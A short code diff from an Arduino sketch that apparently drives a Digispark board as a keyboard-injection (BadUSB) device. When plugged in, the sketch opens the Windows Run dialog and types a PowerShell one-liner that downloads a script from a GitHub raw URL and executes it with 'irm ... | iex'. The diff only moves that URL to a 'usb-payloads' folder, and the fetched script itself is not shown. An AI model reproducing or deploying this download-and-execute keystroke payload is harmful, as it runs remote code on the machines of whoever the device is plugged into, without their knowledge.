@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
-  DigiKeyboard.print(F("powershell -NoExit -c irm https://raw.githubusercontent.com/S3bDur/DigiSpark/refs/heads/main/scripts/02-sapi.ps1|iex"));
+  DigiKeyboard.print(F("powershell -NoExit -c irm https://raw.githubusercontent.com/S3bDur/DigiSpark/refs/heads/main/usb-payloads/02-sapi/02-sapi-script.ps1|iex"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   for (;;) {
